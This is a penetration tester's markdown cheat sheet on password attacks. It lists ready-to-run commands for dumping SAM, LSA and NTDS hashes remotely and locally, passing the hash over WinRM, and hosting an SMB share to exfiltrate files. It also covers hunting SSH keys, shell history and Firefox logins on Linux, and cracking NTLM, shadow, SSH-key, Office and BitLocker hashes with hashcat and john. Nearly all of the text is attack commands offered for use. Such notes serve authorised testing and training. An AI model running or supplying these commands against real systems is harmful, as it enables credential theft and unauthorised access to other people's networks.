#passwords #credential-dumping #lsass #ntds #john

# Password Attacks

Remote + local credential dumping and offline cracking. Related: [hashcat](hashcat.md) · [login-brute-forcing](login-brute-forcing.md) · [dcsync](../AD/dcsync.md) · [privesc](../Windows/privesc.md) · [privesc](../Linux/privesc.md)

## Connect
```bash
evil-winrm -i <ip> -u user -p password
```
PowerShell session over WinRM.

```bash
python3 smbserver.py -smb2support CompData /home/<user>/Documents/
```
Host an SMB share to exfil files. See [file-transfers](../Tools/file-transfers.md).

## Remote Attacks (NetExec)
```bash
nxc smb <ip> --local-auth -u <username> -p <password> --sam
```
Dump the SAM database over the network.

```bash
nxc smb <ip> --local-auth -u <username> -p <password> --lsa
```
Dump LSA secrets (can yield cleartext).

```bash
nxc smb <ip> -u <username> -p <password> --ntds
```
Dump hashes from NTDS over the network. See [dcsync](../AD/dcsync.md).

```bash
evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```
Pass-the-Hash over WinRM.

```bash
./Pcredz -f demo.pcapng -t -v
```
Extract credentials from a packet capture.

## Windows Local
```cmd
reg save hklm\sam sam.save
```
Save the SAM hive (also `hklm\security`, `hklm\system`).

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
Extract hashes from saved hives (Impacket).

```cmd
vssadmin CREATE SHADOW /For=C:
```
Create a volume shadow copy to grab NTDS.dit safely.

```cmd
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
Copy NTDS.dit from the shadow copy.

```cmd
cmdkey /list
```
Enumerate stored credentials (`runas /savecred /user:<user> cmd` to reuse them).

```cmd
snaffler.exe -s
```
Hunt network shares for credentials. See [credentialed-enumeration](../AD/credentialed-enumeration.md).

## Linux Local
```bash
for l in .conf .config .cnf; do find / -name "*$l" 2>/dev/null | grep -vE "lib|fonts|share|core"; done
```
Find config files that may hold creds.

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
Hunt for SSH private keys (also `ssh-rsa`).

```bash
tail -n5 /home/*/.bash*
```
Check shell history for credentials.

```bash
python3 mimipenguin.py
```
Dump cleartext creds from memory (also `lazagne.py all`).

```bash
cat .mozilla/firefox/*.default-release/logins.json | jq .
```
Locate Firefox saved logins (`python3 firefox_decrypt.py` to decrypt).

## Cracking
```bash
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt
```
Crack NTLM hashes.

```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt
```
Combine passwd+shadow and crack (sha512crypt).

```bash
python3 ssh2john.py SSH.private > ssh.hash && john --wordlist=rockyou.txt ssh.hash
```
Crack an encrypted SSH private key.

```bash
office2john.py Protected.docx > doc.hash && john --wordlist=rockyou.txt doc.hash
```
Crack an Office document (also `pdf2john.pl`, `zip2john`).

```bash
bitlocker2john -i Backup.vhd > backup.hashes && hashcat -m 22100 backup.hashes rockyou.txt
```
Crack a BitLocker volume.

## Pivoting
See [pivoting](../Network/pivoting.md) for SSH SOCKS proxies and proxychains to reach internal hosts.
